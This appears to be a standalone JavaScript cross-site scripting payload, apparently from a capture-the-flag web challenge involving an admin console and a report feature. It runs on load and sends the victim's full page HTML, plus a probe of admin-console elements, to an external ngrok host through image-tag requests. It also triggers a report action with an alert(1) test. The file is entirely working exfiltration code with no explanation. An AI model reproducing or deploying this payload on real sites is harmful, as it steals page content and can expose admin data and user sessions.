
function addTheImage() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.body.innerHTML;
    document.body.appendChild(img);
}
function addTheImage2() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").length;
    document.body.appendChild(img);
}

function addTheImage3() {
   
            
            $('#responseAlert').css('display','inline');
            $('#report').on('click',function(e){
                $.ajax({
                    type: "GET",
                    url: window.location.pathname+"/report",
                    success: function(resp) {
                        $("#responseAlert").text(resp); $("#responseAlert").css("display","inline");
                        alert(1);
                    }
                })
            });
            

             
        
}
addTheImage();
addTheImage2();
addTheImage3();

